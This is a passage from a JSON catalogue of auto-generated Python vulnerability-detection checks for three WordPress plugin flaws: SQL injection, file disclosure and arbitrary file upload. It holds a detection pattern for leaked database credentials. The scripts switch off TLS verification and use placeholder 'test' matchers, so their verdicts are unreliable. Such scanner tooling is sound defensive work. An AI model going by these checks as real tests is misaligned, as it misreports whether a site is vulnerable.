        "language": "Python",
        "famille": "WebApp",
        "description": "The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-autosuggest-sql-injection\nName: WP AutoSuggest 0.24 - SQL Injection\nSeverity: critical\nDescription: The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_autosuggest_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-autosuggest-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"WP AutoSuggest 0.24 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WP AutoSuggest 0.24 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_autosuggest_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-autosuggest-sql-injection\nName: WP AutoSuggest 0.24 - SQL Injection\nSeverity: critical\nDescription: The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_autosuggest_sql_injection:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-autosuggest-sql-injection\"\n    SEVERITY = \"critical\"\n    NAME = \"WP AutoSuggest 0.24 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WP AutoSuggest 0.24 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_autosuggest_sql_injection(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "wp-plugin",
          "wp",
          "wp-autosuggest",
          "wpscan",
          "sqli",
          "wordpress",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wp_googlemp3_lfi",
        "name": "WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download",
        "language": "Python",
        "famille": "WebApp",
        "description": "WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'DB_USER, DB_PASSWORD, DB_HOST' | mot(s) 'application/octet-stream' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-googlemp3-lfi\nName: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\nSeverity: critical\nDescription: WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_googlemp3_lfi:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-googlemp3-lfi\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DB_USER, DB_PASSWORD, DB_HOST' | mot(s) 'application/octet-stream' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DB_USER, DB_PASSWORD, DB_HOST', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_googlemp3_lfi(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-googlemp3-lfi\nName: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\nSeverity: critical\nDescription: WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated attacker to download file from server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_googlemp3_lfi:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-googlemp3-lfi\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DB_USER, DB_PASSWORD, DB_HOST' | mot(s) 'application/octet-stream' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DB_USER, DB_PASSWORD, DB_HOST', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_googlemp3_lfi(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wp-plugin",
          "wp",
          "wordpress",
          "lfi",
          "google-mp3-audio-player",
          "unauth",
          "disclosure",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wp_kadence_blocks_rce",
        "name": "WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "The Kadence Blocks for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the process_fields function in versions up to, and including, 3.1.10. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_2 == 200; contains(header_2, \"application/json\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "str",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: str",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          },
          {
            "name": "email",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: email",
            "default": "{{rand_base(8)}}@{{rand_base(5)}}.com"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "wp-kadence-blocks-rce"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wp-kadence-blocks-rce\nName: WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\nSeverity: critical\nDescription: The Kadence Blocks for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the process_fields function in versions up to, and including, 3.1.10. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wp_kadence_blocks_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wp-kadence-blocks-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(header_2, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wp_kadence_blocks_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    